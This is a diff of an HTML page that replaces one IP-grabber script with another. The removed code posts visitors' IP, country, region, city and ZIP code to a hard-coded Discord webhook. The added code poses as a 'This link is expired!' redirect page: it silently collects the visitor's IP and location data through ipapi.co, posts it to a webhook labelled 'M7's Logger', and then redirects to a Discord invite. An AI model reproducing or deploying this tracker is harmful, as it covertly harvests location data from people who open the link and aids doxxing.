@@ -1,40 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-     <meta charset="UTF-8">
-     <title>Thomsen Ip Grabber</title>
-     <link rel="stylesheet" href="style.css">
+  <title> Redirecting... </title>
+  <meta charset="utf-8" />
+  <h1> <center> This link is expired! </center> </h1>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js" charset="utf-8"></script>
 </head>
 <body>
-     <div class="content">
-          <h2>Thomsen</h2>
-          <h2>Thomsen</h2>
-     </div>
+
+  <script type="text/javascript">
+  var WEBURL = "";
+  $.getJSON('https://ipapi.co/json/', function(data) {
+  $.post(WEBURL, {
+      content: "Ip : " + data.ip + "\nCity : " + data.city + "\nCountry : " + data.country + "/" + data.country_name + "\nTimeZone : " + data.timezone + "\nCurrency : " + data.currency + "/" + data.currency_name + "\nLanguages : " + data.languages + "\nNumber-Code : " + data.country_calling_code + "\n@here", username: "M7's Logger",avatar_url: null,});
+  });
+  window.location.href = "https://discord.gg/X8Mu3jgh";
+  </script>
 </body>
 </html>
-
-function monke(json) 
-{
-     var request = new XMLHttpRequest();
-     
-     request.open("POST", "https://discord.com/api/webhooks/1203591136829120522/-G484qMKwZ_VFOAOT3xA8dFMyvk1Ac0y8cvhy1gykPoZt_SvIbsatm7jYzWT85YHGlwk");
-
-     request.setRequestHeader('Content-type', 'application/json');
-
-     var params = 
-     {
-          username: "Thomsen's IP Grabber",
-          avatar_url: "https://cdn.discordapp.com/attachments/1122977732385579030/1159803884257149039/ab024efe2306f15b6a2c50a18732c407.png?ex=65325a8a&is=651fe58a&hm=0da8d1f5655d1a075f040c338cad6abdb134953d5424c53389d0bd713092d23c&",
-          embeds: [
-               {
-                    title: "Thomsen's IP Grabber",
-                    color: 15000,
-                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
-               }
-          ]
-     }
-
-     request.send(JSON.stringify(params));
-}
-</script>
-<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
